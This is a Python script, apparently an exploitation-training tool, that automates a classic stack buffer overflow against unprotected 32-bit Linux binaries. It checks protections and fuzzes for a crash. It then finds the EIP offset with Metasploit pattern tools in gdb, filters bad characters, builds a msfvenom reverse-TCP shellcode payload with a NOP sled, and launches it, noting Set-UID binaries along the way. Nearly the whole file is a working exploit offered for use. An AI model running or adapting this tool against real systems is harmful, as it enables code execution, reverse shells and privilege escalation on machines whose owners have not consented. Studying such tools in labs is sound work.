#!/bin/python3
import subprocess as sp
import argparse
import sys
import base64
import time
from pwn import *
import os
from stat import *

banner = base64.b64decode("ICBfX18gX18gIF9fICAgXyAgIF9fXyBfICBfIF9fXyBfICBfICBfX18gCiAvIF9ffCAgXC8gIHwgL19cIC8gX198IHx8IHxfIF98IFx8IHwvIF9ffAogXF9fIHwgfFwvfCB8LyBfIFxcX18gfCBfXyB8fCB8fCAuYCB8IChfIHwKIHxfX198X3wgIHxfL18vIFxffF9fX3xffHxffF9fX3xffFxffFxfX198CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgIF9fX19fIF8gIF8gX19fICAgIF9fXyAgX19fICBfX18gICAgICAKICAgIHxfICAgX3wgfHwgfCBfX3wgIHwgXyApLyBfIFx8IF9ffCAgICAgCiAgICAgIHwgfCB8IF9fIHwgX3wgICB8IF8gfCAoXykgfCBffCAgICAgIAogICAgICB8X3wgfF98fF98X19ffCAgfF9fXy9cX19fL3xffCAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCg==").decode("utf-8")


class color:
    byellow = '\033[33m'
    yellow = '\033[93m'
    yellow_bg = '\033[43m'
    bblue = '\033[34m'
    blue = '\033[94m'
    bgreen = '\033[32m'
    green = '\033[92m'
    bred = '\033[31m'
    red = '\033[91m'
    end = '\033[0m'

def get_args():
    parser = argparse.ArgumentParser(description=". Author: 0xKn")
    parser.add_argument("-f", "--file", help = "Binary File", required=True, type=str)
    parser.add_argument("-p", "--port", help = "Local Port Number", required=True, type=int)
    return parser.parse_args()

def checkOS(args):
    cmd = "file {0}".format(args.file)
    output = sp.getoutput(cmd)
    print(f"[ {color.byellow}*{color.end} ] {color.yellow}Checking OS...{color.end}")
    time.sleep(1)
    if 'Linux' in output:
        print(f"[ {color.bgreen}+{color.end} ] {color.green}OS supported{color.end}")
    else:
        sys.exit(f"[ {color.bred}-{color.end} ] {color.red}This script is only for Linux Binaries{color.end}")

def checkBits(args):
    print(f"[ {color.byellow}*{color.end} ] {color.yellow}Checking if the binary is 32-bit (x86) or 64-bit (x64)...{color.end}")
    elf_file = ELF(args.file)
    binary_bits = elf_file.bits
    time.sleep(1)
    if binary_bits == 32:
        print(f"[ {color.bgreen}+{color.end} ] {color.green}32-bit binary{color.end}")
    elif binary_bits == 64:
        sys.exit(f"[ {color.bred}-{color.end} ] {color.red}64-bit binary is not supported{color.end}")
    else:
        version = int(input('''Select a version:
  1) 32-bit
  2) 64-bit (not supported)
  3) None of the above
-> '''))
        if version == 1:
            print(f"[ {color.bgreen}+{color.end} ] {color.green}32-bit binary{color.end}")
        elif version == 2:
            sys.exit(f"[ {color.bred}-{color.end} ] {color.red}64-bit binary is not supported{color.end}")
        elif version == 3:
            sys.exit(f"[ {color.bred}-{color.end} ] {color.red}Not supported{color.end}")
        else:
            print(f"[ {color.bred}-{color.end} ] {color.red}Unrecognised format{color.end}")
            checkBits(args)
    return elf_file

def checkProtections(elf_file):
    print("\n-----------------------------------------------")
    print(f"               {color.byellow}Binary protections{color.end}              ")
    print("-----------------------------------------------")
    print(f"[ {color.byellow}*{color.end} ] {color.yellow}Checking protections...{color.end}")
    time.sleep(1)
    relro = elf_file.relro
    canary = elf_file.canary
    execstack = elf_file.execstack
    nx = elf_file.nx
    if execstack:
        print(f"[ {color.bgreen}+{color.end} ] {color.green}execstack: {color.end} The stack is executable")
    else:
        sys.exit(f"[ {color.bred}-{color.end} ] {color.red}The stack is not executable{color.end}")

    if relro and relro != 'Partial':
        sys.exit(f"[ {color.bred}-{color.end} ] {color.red}RELRO protection not supported{color.end}")
    else:
        print(f"[ {color.bgreen}+{color.end} ] {color.green}RELRO: {color.end} off/partial")

    if canary:
        sys.exit(f"[ {color.bred}-{color.end} ] {color.red}Canary protection not supported{color.end}")
    else:
        print(f"[ {color.bgreen}+{color.end} ] {color.green}Canary: {color.end} off")

    if nx:
        sys.exit(f"[ {color.bred}-{color.end} ] {color.red}NX protection not supported{color.end}")
    else:
        print(f"[ {color.bgreen}+{color.end} ] {color.green}NX: {color.end} off")

def fuzzingBinary(args):
    print("\n-----------------------------------------------")
    print(f"                    {color.byellow}Fuzzing{color.end}                    ")
    print("-----------------------------------------------")
    buffer_char = 'A'
    max = 1500
    min = 10
    increment = 50
    buffer = [buffer_char*count for count in range(min, max, increment)]
    for string in buffer:
        try:
            cmd = "./{0}".format(args.file)
            len_string = str(len(string)+increment)
            print(f"[ {color.byellow}*{color.end} ] Sending {str(len(string))} bytes")
            output = sp.run([cmd, string], capture_output=True, check=True)
            time.sleep(0.5)
        except sp.CalledProcessError as e:
            time.sleep(0.5)
            print(f"[ {color.bred}!{color.end} ] {color.red}The program crashed{color.end}")
            print(f"[ {color.bblue}i{color.end} ] {color.blue}The recommended number of bytes to create the pattern is {len_string}.{color.end}")
            return len_string
    else:
        sys.exit(f"[ {color.bred}-{color.end} ] {color.red}Target not vulnerable{color.end}")


def obtainUser(args):
    print("\n-----------------------------------------------")
    print(f"               {color.byellow}Obtaining user id{color.end}               ")
    print("-----------------------------------------------")
    time.sleep(1)
    output = sp.run(['id'], capture_output=True, check=True, text=True)
    userID = output.stdout.rstrip()
    print(f"[ {color.bgreen}+{color.end} ] {color.green}Your user id is:{color.end} \n{color.blue}{userID}{color.end}")
    mode = os.stat(args.file).st_mode
    if (mode & stat.S_ISUID):
        print(f"[ {color.bgreen}+{color.end} ] {color.green}Set-UID program{color.end}")
    return userID

def pattern_create(nbytes):
    print("\n-----------------------------------------------")
    print(f"    {color.byellow}Finding the Offset & Overwriting the EIP{color.end}   ")
    print("-----------------------------------------------")
    print(f'[ {color.byellow}*{color.end} ] {color.yellow}Creating a pattern{color.end}')
    time.sleep(1)
    output = sp.run(['/usr/share/metasploit-framework/tools/exploit/pattern_create.rb', '-l', str(int(nbytes))], capture_output=True, check=True, text=True)
    pattern = output.stdout.split()
    print(f'[ {color.bgreen}+{color.end} ] {color.green}Pattern created:{color.end} {pattern[0]}')
    return pattern[0]

def pattern_offset(args,pattern):
    print(f'[ {color.byellow}*{color.end} ] {color.yellow}Calculating offset...{color.end}')
    time.sleep(2)
    proc = sp.Popen(['gdb','-q',args.file], stdin=sp.PIPE, stdout=sp.PIPE, text=True)
    proc.stdin.write(f'run {pattern} \n')
    proc.stdin.flush()
    proc.stdin.write('info registers $eip \n')
    proc.stdin.flush()
    proc.stdin.write('quit \n')
    proc.stdin.flush()
    output = proc.stdout.readlines()
    eip_line = ' '.join([i for i in output if 'eip' in i])
    pos = eip_line.index("0x")
    eip = eip_line[pos:pos+10]
    output = sp.run(['/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb', '-q', eip], capture_output=True, check=True, text=True)
    offset = output.stdout.split()
    if int(offset[5]) < 260:
        sys.exit(f"[ {color.bred}-{color.end} ] {color.red}The program is designed to exploit binaries of + 260 bytes. Actual offset: {offset[5]}{color.end}")
    print(f'[ {color.bgreen}+{color.end} ] {color.green}The offset obtained is:{color.end} {offset[5]}')
    print(f'[ {color.bgreen}+{color.end} ] {color.green}The EIP address is:{color.end} {eip}')
    return offset[5]

def badchars(args, offset):
    print("\n-----------------------------------------------")
    print(f"             {color.byellow}Finding Bad Characters{color.end}            ")
    print("-----------------------------------------------")
    chars = ""
    print(f'[ {color.byellow}*{color.end} ] {color.yellow}Creating bad characters list...{color.end}')
    time.sleep(2)
    #let's create the badchars string
    # \x00 has been excluded
    for num in range(1,256):
        # x = hex format 2: minimun width 0: zero-padding on the left
        chars += "\\\\x" + '{:02x}'.format(num)
    # chars length: 256
    chars2 = chars.replace("\\\\","\\")
    print(f'[ {color.byellow}*{color.end} ] {color.green}Bad characters list:{color.end} {chars2}')
    print(f'[ {color.byellow}*{color.end} ] {color.yellow}Sending bad characters...{color.end}')
    time.sleep(1)
    free = int(offset) - 256
    start = 'B' * 4
    buff = 'A' * (free - 4)
    end = 'C' * 4
    proc = sp.Popen(['gdb','-q',args.file], stdin=sp.PIPE, stdout=sp.PIPE, text=True)
    proc.stdin.write('set pagination off \n')
    proc.stdin.write('set confirm off \n')
    proc.stdin.write('b main \n')
    proc.stdin.flush()
    proc.stdin.write(f'run $(python2 -c "print \'{buff}\' + \'{start}\' + \'{chars}\' + \'{end}\'")\n')
    proc.stdin.flush()
    proc.stdin.write('set logging file buffer.txt \n')
    proc.stdin.write('set logging on \n')
    proc.stdin.write('x/2000xb $esp \n')
    proc.stdin.flush()
    proc.stdin.write('quit \n')
    proc.stdin.flush()
    proc.stdout.readlines()

    #---getting the character string from the buffer---
    format_string = 'cat buffer.txt | awk -F ":" \'{print $2}\' | tr -d "[:space:]" | sed -e "s/0x/ /g" > buffer_format.txt'
    formatting = 'cat buffer_format.txt | sed -e "s/^.*42 42 42 42/asd/" | sed -e "s/asd//g" | sed -e "s/43 43 43 43.*/asd/" | sed -e "s/asd//g" | sed -e "s/^.//g" > chars.txt'
    sp.run([format_string], shell=True)
    sp.run([formatting], shell=True)
    file = open('chars.txt', 'r')
    chars_buffer = file.readline()
    file.close()
    sp.run(['rm', 'buffer_format.txt'])
    sp.run(['rm', 'chars.txt'])
    sp.run(['rm', 'buffer.txt'])

    #---analysing and comparing bad characters in the buffer---
    char_list = list(filter(None,chars_buffer.split(" ")))
    chars_base = chars.replace("\\\\x"," ")
    chars_base = list(filter(None,chars_base.split(" ")))
    list_compared = (list(list(set(char_list)-set(chars_base)) + list(set(chars_base)-set(char_list))))
    badchars = ' '.join(['\\x' + x for x in list_compared if x not in char_list])
    badchars = '\\x00 ' + badchars
    print(f'[ {color.bgreen}+{color.end} ] {color.green}Bad characters found:{color.end} {badchars}')
    return badchars


def generating_shellcode(badchars,args):
    print("\n-----------------------------------------------")
    print(f"              {color.byellow}Generating Shellcode{color.end}             ")
    print("-----------------------------------------------")
    print(f'[ {color.byellow}*{color.end} ] {color.yellow}Generating shellcode...{color.end}')
    time.sleep(1)
    badchars = badchars.replace(" ","")
    output = sp.run(["msfvenom","-p","linux/x86/shell_reverse_tcp","LHOST=127.0.0.1",f"LPORT={str(args.port)}","-f","python","--platform","linux","-a","x86","-v","payload","-b",f"{badchars}","--out","shell.txt"], capture_output=True, check=True, text=True)
    out = output.stderr
    pos = out.index("Payload size:")+len("Payload size: ")
    bytes = out[pos:pos+2]
    file = open('shell.txt', 'r')
    msfvenom_shellcode = file.readlines()
    file.close()
    sp.run(['rm', 'shell.txt'])
    msfvenom_shellcode = ''.join([line for line in msfvenom_shellcode])
    shellcode = msfvenom_shellcode.replace("payload += b\"","").replace("\"","").replace("payload =  b","")
    shell = shellcode.replace("\n", "")
    print(f'[ {color.bgreen}+{color.end} ] {color.green}Shellcode generated:{color.end}')
    print(msfvenom_shellcode)
    return shell,bytes


def build_exploit(offset,output,args):
    print("\n-----------------------------------------------")
    print(f"              {color.byellow}Building the exploit{color.end}             ")
    print("-----------------------------------------------")
    print(f'[ {color.byellow}*{color.end} ] {color.yellow}Building the exploit...{color.end}')
    time.sleep(2)
    shellcode = output[0]
    shellcode_length = output[1]
    buffer_size = int(offset) - 120 - int(shellcode_length)
    buffer = 'A' * buffer_size
    nops = '\\\\x90' * 120
    eip = 'B' * 4
    print(f'[ {color.bgreen}*{color.end} ] {color.green}Buffer = Offset({offset}) - NOPS(120) - Shellcode({shellcode_length}) ={color.end} {int(offset) - 120 - int(shellcode_length)}')
    print(f'[ {color.bgreen}+{color.end} ] {color.green}NOPs ={color.end} 120')
    print(f'[ {color.bgreen}+{color.end} ] {color.green}Shellcode ={color.end} {shellcode_length}')
    print(f'[ {color.bgreen}+{color.end} ] {color.green}EIP ={color.end} 4')
    shellcode = shellcode.replace("\\","\\\\")
    print(f'[ {color.byellow}*{color.end} ] {color.yellow}Looking for a NOP sled...{color.end}')
    time.sleep(2)
    proc = sp.Popen(['gdb','-q',args.file], stdin=sp.PIPE, stdout=sp.PIPE, text=True)
    proc.stdin.write('set pagination off \n')
    proc.stdin.write('set confirm off \n')
    proc.stdin.flush()
    proc.stdin.write(f'run $(python2 -c "print \'{buffer}\' + \'{nops}\' + \'{shellcode}\' + \'{eip}\'")\n')
    proc.stdin.flush()
    proc.stdin.write('set logging file shellcode.txt \n')
    proc.stdin.write('set logging on \n')
    proc.stdin.write('x/2000xw $esp \n')
    proc.stdin.flush()
    proc.stdin.write('quit \n')
    proc.stdin.flush()
    proc.stdout.readlines()

    file = open('shellcode.txt', 'r')
    buffer = file.readlines()
    file.close()
    sp.run(['rm', 'shellcode.txt'])
    nops_addresses = [i[:10] for i in buffer if '0x90909090\t0x90909090\t0x90909090\t0x90909090' in i]
    address = next((i[2:] for i in nops_addresses if '00' not in i), None)
    print(f'[ {color.bgreen}+{color.end} ] {color.green}Address:{color.end} 0x{address}')
    return address

def launchExploit(offset, output, address, args):
    print("\n-----------------------------------------------")
    print(f"             {color.byellow}Launching the exploit{color.end}             ")
    print("-----------------------------------------------")
    print(f'[ {color.byellow}*{color.end} ] {color.yellow}Launching the exploit...{color.end}')
    time.sleep(3)
    print(f"[ {color.bblue}i{color.end} ] {color.blue}Do not forget to use your listener in the port {args.port}.{color.end}")
    shellcode = output[0]
    shellcode_length = output[1]
    address = ['\\x'+(address[i:i+2]) for i in range(0, len(address), 2)]
    address.reverse()
    address_littleendian = ''.join([elem for elem in address])
    buffer_size = int(offset) - 120 - int(shellcode_length)
    buffer = 'A' * buffer_size
    nops = '\\x90' * 120
    eip = 'B' * 4
    buff = ''.join('\\x' + i.encode().hex() for i in buffer)
    exploit = f"{buff} + {nops} + {shellcode} + {address_littleendian}"
    print(f'[ {color.bgreen}+{color.end} ] {color.green}Exploit:{color.end} {exploit}')
    payload = f'./{args.file} $(python2 -c "print \'{buffer}\' + \'{nops}\' + \'{shellcode}\' + \'{address_littleendian}\'") > /dev/null 2>&1 &'
    sp.run([payload], shell=True)


def main():
    args = get_args()
    print(f'[ {color.byellow}*{color.end} ] {color.yellow}Starting the exploit{color.end}')
    checkOS(args)
    elf_file = checkBits(args)
    checkProtections(elf_file)
    nbytes = fuzzingBinary(args)
    userID = obtainUser(args)
    pattern = pattern_create(nbytes)
    offset = pattern_offset(args, pattern)
    badchars2 = badchars(args, offset)
    output = generating_shellcode(badchars2, args)
    address = build_exploit(offset, output, args)
    launchExploit(offset, output, address, args)

if __name__ == '__main__':
    try:
        print(banner)
        main()
    except KeyboardInterrupt:
        print(f'[ {color.bred}!{color.end} ] Interrupted')
